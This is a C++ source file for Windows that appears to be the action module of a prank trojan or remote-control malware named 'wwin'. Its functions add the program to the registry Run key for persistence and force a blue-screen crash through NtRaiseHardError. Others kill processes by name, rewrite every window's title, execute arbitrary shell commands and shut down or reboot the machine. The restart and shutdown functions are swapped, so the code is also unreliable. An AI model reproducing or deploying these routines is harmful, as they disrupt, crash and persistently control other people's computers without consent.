#include <Windows.h>
#include <TlHelp32.h>

#include <string>

#pragma comment(lib, "ntdll.lib")

using namespace std;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

namespace Wwin
{
	BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
	{
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)lParam, SMTO_ABORTIFHUNG, 100, NULL);

		return TRUE;
	}

	void UtilsAddStartup()
	{
		HKEY hKey;
		LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		wstring exePath(MAX_PATH, L'\0');

		LPCWSTR appName = L"wwin";

		if (GetModuleFileNameW(NULL, &exePath[0], MAX_PATH) != 0)
		{
			if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
			{
				RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)exePath.c_str(), static_cast<DWORD>((exePath.size() + 1) * sizeof(wchar_t)));

				RegCloseKey(hKey);
			}
		}
	}

	void UtilsRemoveStartup()
	{
		HKEY hKey;
		LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

		LPCWSTR appName = L"wwin";

		if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			RegDeleteValueW(hKey, appName);
			RegCloseKey(hKey);
		}
	}

	void UtilsRestartSystem()
	{
		ExitWindowsEx(EWX_SHUTDOWN, 0);
	}

	void UtilsShutdownSystem()
	{
		ExitWindowsEx(EWX_REBOOT, 0);
	}

	void UtilsMuteVolume()
	{
		SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, MAKELPARAM(0, APPCOMMAND_VOLUME_MUTE));
	}

	void UtilsUnmuteVolume()
	{
		SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, MAKELPARAM(0, APPCOMMAND_VOLUME_UP));
	}

	bool UtilsCheckProcessRunning(const wchar_t* processName)
	{
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		bool isRunning = false;

		if (Process32First(snapshot, &entry))
		{
			while (true)
			{
				if (_wcsicmp(entry.szExeFile, processName) == 0)
				{
					isRunning = true;
					break;
				}

				if (!Process32Next(snapshot, &entry))
					break;
			}
		}

		CloseHandle(snapshot);
		return isRunning;
	}

	void UtilsKillProcessByName(const wchar_t* processName)
	{
		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);

		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (Process32First(snapshot, &entry))
		{
			while (true)
			{
				if (_wcsicmp(entry.szExeFile, processName) == 0)
				{
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, entry.th32ProcessID);
					if (hProcess != NULL)
					{
						TerminateProcess(hProcess, 0);

						CloseHandle(hProcess);
					}
				}

				if (!Process32Next(snapshot, &entry))
					break;
			}
		}

		CloseHandle(snapshot);
	}

	void UtilsChangeWindowsTitle(const wchar_t* title)
	{
		EnumWindows(EnumWindowsProc, (LPARAM)title);
	}

	void UtilsExecuteCommand(const wchar_t* command)
	{
		_wsystem(command);
	}

	void UtilitsBlueScreen()
	{
		BOOLEAN PrivilegeState = FALSE;
		ULONG ErrorResponse = 0;

		RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
		NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
	}
}